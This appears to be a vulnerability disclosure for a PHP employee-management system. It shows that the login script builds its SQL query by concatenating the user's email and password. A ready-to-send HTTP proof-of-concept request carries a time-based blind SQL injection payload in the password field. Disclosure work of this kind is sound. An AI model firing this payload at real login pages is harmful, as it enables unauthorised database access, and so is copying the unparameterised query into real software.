### Vulnerability file address

`Account/Login.php` from line 14,The `$password` parameter is controllable and the `$password` is not protected from sql injection, line 18 ` $sql = "SELECT * FROM tblemployee WHERE email='" .$email. "' and password = '".$password."'  and status = '".$status."'";` ,line 19 `$result = mysqli_query($conn,$sql);`,line 19 performs a SQL query, causing SQL injection

```php
<?php
include('../inc/topbar.php'); 


if(isset($_POST['btnlogin'])){


//Get Date
date_default_timezone_set('Africa/Lagos');
$current_date = date('Y-m-d h:i:s');


$email = $_POST['txtemail'];
$password = $_POST['txtpassword'];
$status = '1';


 $sql = "SELECT * FROM tblemployee WHERE email='" .$email. "' and password = '".$password."'  and status = '".$status."'";
  $result = mysqli_query($conn, $sql);
```

### POC

```http
POST /CMS/php/employee_akpoly/Account/Login.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Origin: http://10.0.0.20:82
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Account/Login.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

txtemail=1@qq.com&txtpassword=1' AND (SELECT 4536 FROM (SELECT(SLEEP(5)))fZVr)-- ndup&btnlogin=
```

### Attack results pictures

![image-20250128230059878](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501282300923.png)
